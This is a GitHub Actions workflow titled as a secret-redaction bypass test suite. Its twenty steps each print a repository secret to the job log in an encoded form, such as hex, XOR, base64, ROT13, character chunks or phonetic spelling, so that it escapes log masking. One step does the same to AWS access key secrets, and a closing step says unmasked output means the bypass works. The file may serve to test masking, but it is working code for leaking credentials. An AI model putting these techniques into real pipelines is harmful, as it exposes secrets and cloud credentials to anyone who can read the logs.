name: Vector - Secret Redaction Bypass (Advanced)
on:
  workflow_dispatch:

jobs:
  bypass-tests:
    runs-on: ubuntu-latest
    steps:
      # ============================================================
      # TEST 1: Character-by-character extraction (one char per line)
      # ============================================================
      - name: "Bypass 1: Char-by-char extraction"
        run: |
          SECRET="${{ secrets.FAKE_SECRET }}"
          echo "=== Bypass 1: Char-by-char ==="
          for (( i=0; i<${#SECRET}; i++ )); do
            echo "char[$i]=${SECRET:$i:1}"
          done
          echo "--- Reassemble offline ---"

      # ============================================================
      # TEST 2: Hex encoding
      # ============================================================
      - name: "Bypass 2: Hex encoding"
        run: |
          SECRET="${{ secrets.FAKE_SECRET }}"
          echo "=== Bypass 2: Hex ==="
          echo "$SECRET" | xxd -p
          echo "--- Hex encoded above ---"

      # ============================================================
      # TEST 3: XOR encryption with hardcoded key
      # ============================================================
      - name: "Bypass 3: XOR with key 0x42"
        run: |
          SECRET="${{ secrets.FAKE_SECRET }}"
          KEY=42
          echo "=== Bypass 3: XOR ciphertext (hex) ==="
          echo -n "$SECRET" | while IFS= read -r -n1 char; do
            [ -n "$char" ] && printf '%02x' $(( $(printf '%d' "'$char") ^ KEY ))
          done
          echo ""
          echo "--- XOR key: 0x42 ---"

      # ============================================================
      # TEST 4: Base64 (already tested - expect mask)
      # ============================================================
      - name: "Bypass 4: Base64"
        run: |
          echo "=== Bypass 4: Base64 ==="
          echo "${{ secrets.FAKE_SECRET }}" | base64
          echo "--- Base64 above ---"

      # ============================================================
      # TEST 5: Reverse string
      # ============================================================
      - name: "Bypass 5: Reverse string"
        run: |
          SECRET="${{ secrets.FAKE_SECRET }}"
          echo "=== Bypass 5: Reversed ==="
          echo "$SECRET" | rev
          echo "--- Reverse with: rev ---"

      # ============================================================
      # TEST 6: Split into chunks (2 chars per line)
      # ============================================================
      - name: "Bypass 6: 2-char chunks"
        run: |
          SECRET="${{ secrets.FAKE_SECRET }}"
          echo "=== Bypass 6: 2-char chunks ==="
          for (( i=0; i<${#SECRET}; i+=2 )); do
            echo "chunk=${SECRET:$i:2}"
          done
          echo "--- Reassemble: chunk0+chunk1+... ---"

      # ============================================================
      # TEST 7: URL encoding (percent-encode)
      # ============================================================
      - name: "Bypass 7: URL encoding"
        run: |
          SECRET="${{ secrets.FAKE_SECRET }}"
          echo "=== Bypass 7: URL encoded ==="
          python3 -c "import urllib.parse; print(urllib.parse.quote('$SECRET'))"
          echo "--- URL encoded above ---"

      # ============================================================
      # TEST 8: JSON unicode escapes
      # ============================================================
      - name: "Bypass 8: JSON unicode escapes"
        run: |
          SECRET="${{ secrets.FAKE_SECRET }}"
          echo "=== Bypass 8: JSON unicode ==="
          python3 -c "import json; print(json.dumps('$SECRET'))"
          echo "--- JSON unicode above ---"

      # ============================================================
      # TEST 9: ROT13 cipher
      # ============================================================
      - name: "Bypass 9: ROT13"
        run: |
          SECRET="${{ secrets.FAKE_SECRET }}"
          echo "=== Bypass 9: ROT13 ==="
          echo "$SECRET" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
          echo "--- Decode: tr 'A-Za-z' 'N-ZA-Mn-za-m' ---"

      # ============================================================
      # TEST 10: ASCII codes (space-separated)
      # ============================================================
      - name: "Bypass 10: ASCII codes"
        run: |
          SECRET="${{ secrets.FAKE_SECRET }}"
          echo "=== Bypass 10: ASCII codes ==="
          echo -n "$SECRET" | while IFS= read -r -n1 char; do
            [ -n "$char" ] && printf '%d ' "'$char"
          done
          echo ""
          echo "--- ASCII codes above ---"

      # ============================================================
      # TEST 11: Binary representation
      # ============================================================
      - name: "Bypass 11: Binary"
        run: |
          SECRET="${{ secrets.FAKE_SECRET }}"
          echo "=== Bypass 11: Binary ==="
          echo -n "$SECRET" | while IFS= read -r -n1 char; do
            [ -n "$char" ] && printf '%08d ' "$(echo "obase=2;$(printf '%d' "'$char")" | bc)"
          done
          echo ""
          echo "--- Binary above ---"

      # ============================================================
      # TEST 12: Phonetic alphabet (A=Alpha, B=Bravo...)
      # ============================================================
      - name: "Bypass 12: Phonetic alphabet"
        run: |
          SECRET="${{ secrets.FAKE_SECRET }}"
          echo "=== Bypass 12: Phonetic ==="
          python3 << 'PYEOF'
          phonetic = {
            'A':'Alpha', 'B':'Bravo', 'C':'Charlie', 'D':'Delta', 'E':'Echo',
            'F':'Foxtrot', 'G':'Golf', 'H':'Hotel', 'I':'India', 'J':'Juliet',
            'K':'Kilo', 'L':'Lima', 'M':'Mike', 'N':'November', 'O':'Oscar',
            'P':'Papa', 'Q':'Quebec', 'R':'Romeo', 'S':'Sierra', 'T':'Tango',
            'U':'Uniform', 'V':'Victor', 'W':'Whiskey', 'X':'X-ray', 'Y':'Yankee', 'Z':'Zulu',
            '0':'Zero', '1':'One', '2':'Two', '3':'Three', '4':'Four',
            '5':'Five', '6':'Six', '7':'Seven', '8':'Eight', '9':'Nine',
            '-':'Dash', '_':'Underscore', '=':'Equals', '/':'Slash', '+':'Plus'
          }
          import os
          secret = os.environ.get('TEST_SECRET', '')
          words = [phonetic.get(c.upper(), c) for c in secret]
          print(' '.join(words))
          PYEOF
          echo "--- Phonetic words above ---"
        env:
          TEST_SECRET: ${{ secrets.FAKE_SECRET }}

      # ============================================================
      # TEST 13: Caesar cipher (shift +3)
      # ============================================================
      - name: "Bypass 13: Caesar +3"
        run: |
          SECRET="${{ secrets.FAKE_SECRET }}"
          echo "=== Bypass 13: Caesar +3 ==="
          echo "$SECRET" | tr 'A-Za-z' 'D-ZA-Cd-za-c'
          echo "--- Decode: tr 'A-Za-z' 'D-ZA-Cd-za-c' ---"

      # ============================================================
      # TEST 14: Interleave with noise chars
      # ============================================================
      - name: "Bypass 14: Interleaved with noise"
        run: |
          SECRET="${{ secrets.FAKE_SECRET }}"
          echo "=== Bypass 14: Interleaved ==="
          result=""
          for (( i=0; i<${#SECRET}; i++ )); do
            result="${result}X${SECRET:$i:1}"
          done
          echo "$result"
          echo "--- Remove every 2nd char (X) to decode ---"

      # ============================================================
      # TEST 15: CRC32 checksum (proves access, not full leak)
      # ============================================================
      - name: "Bypass 15: CRC32 hash"
        run: |
          SECRET="${{ secrets.FAKE_SECRET }}"
          echo "=== Bypass 15: CRC32 ==="
          python3 -c "import zlib; print(hex(zlib.crc32(b'$SECRET') & 0xffffffff))"
          echo "--- CRC32 hash above ---"

      # ============================================================
      # TEST 16: Multi-line secret with line breaks
      # ============================================================
      - name: "Bypass 16: Multi-line with forced line breaks"
        run: |
          SECRET="${{ secrets.FAKE_SECRET }}"
          echo "=== Bypass 16: Line-broken ==="
          echo "$SECRET" | fold -w1
          echo "--- Folded into single chars ---"

      # ============================================================
      # TEST 17: AWS secrets (real-looking format)
      # ============================================================
      - name: "Bypass 17: AWS keyID + Secret"
        run: |
          echo "=== Bypass 17: AWS secrets ==="
          AK="${{ secrets.AWS_ACCESS_KEY_ID }}"
          SK="${{ secrets.AWS_SECRET_ACCESS_KEY }}"
          echo "AccessKey hex: $(echo -n "$AK" | xxd -p)"
          echo "SecretKey hex: $(echo -n "$SK" | xxd -p)"
          echo "AccessKey rot13: $(echo "$AK" | tr 'A-Za-z' 'N-ZA-Mn-za-m')"
          echo "SecretKey rot13: $(echo "$SK" | tr 'A-Za-z' 'N-ZA-Mn-za-m')"
          echo "--- AWS secrets encoded above ---"

      # ============================================================
      # TEST 18: XOR with longer key (phrase-based)
      # ============================================================
      - name: "Bypass 18: XOR with passphrase 'GITHUB'"
        run: |
          SECRET="${{ secrets.FAKE_SECRET }}"
          KEY="GITHUB"
          echo "=== Bypass 18: XOR with passphrase ==="
          python3 << 'PYEOF'
          secret = """$SECRET"""
          key = "$KEY"
          ciphertext = ""
          for i, c in enumerate(secret):
            ciphertext += chr(ord(c) ^ ord(key[i % len(key)]))
          import binascii
          print(binascii.hexlify(ciphertext.encode()).decode())
          PYEOF
          echo "--- XOR passphrase: GITHUB ---"

      # ============================================================
      # TEST 19: Base32 encoding
      # ============================================================
      - name: "Bypass 19: Base32"
        run: |
          SECRET="${{ secrets.FAKE_SECRET }}"
          echo "=== Bypass 19: Base32 ==="
          python3 -c "import base64; print(base64.b32encode(b'$SECRET').decode())"
          echo "--- Base32 above ---"

      # ============================================================
      # TEST 20: UTF-16 encoding
      # ============================================================
      - name: "Bypass 20: UTF-16 hex"
        run: |
          SECRET="${{ secrets.FAKE_SECRET }}"
          echo "=== Bypass 20: UTF-16 ==="
          python3 -c "print('$SECRET'.encode('utf-16').hex())"
          echo "--- UTF-16 hex above ---"

      - name: "Summary"
        run: |
          echo "========================================"
          echo "All bypass tests complete."
          echo "Check each section above for unmasked values."
          echo "If a section shows actual data (not ***), the bypass works."
          echo "========================================"
